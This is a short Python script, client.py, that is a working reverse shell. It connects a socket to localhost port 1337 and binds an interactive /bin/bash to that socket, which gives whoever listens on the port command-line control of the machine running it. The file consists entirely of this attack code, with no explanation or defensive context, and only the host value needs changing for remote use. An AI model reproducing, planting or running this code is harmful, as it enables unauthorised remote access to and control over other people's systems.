# client.py
import socket
import subprocess

s = socket.socket()
s.connect(('localhost', 1337))

process = subprocess.Popen(['/bin/bash', '-i'],
              stdout=s.makefile('wb', buffering=0), stderr=subprocess.STDOUT,
              stdin=s.makefile('rb', buffering=0))
process.wait()